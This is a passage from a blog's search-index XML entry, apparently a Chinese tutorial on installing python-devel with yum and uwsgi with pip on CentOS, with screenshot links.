src="https://img-blog.csdnimg.cn/20190513172343638.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>2安装python依赖</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y python-devel</span><br></pre></td></tr></table></figure><p>正确截图<br><img src="https://img-blog.csdnimg.cn/20190513172402388.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>2安装uwsgi</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install uwsgi</span><br></pre></td></tr></table></figure><p>正确截图<img src="https://img-blog.csdnimg.cn/20190513172421418.png" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> 配环境centosuwsgi错误 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
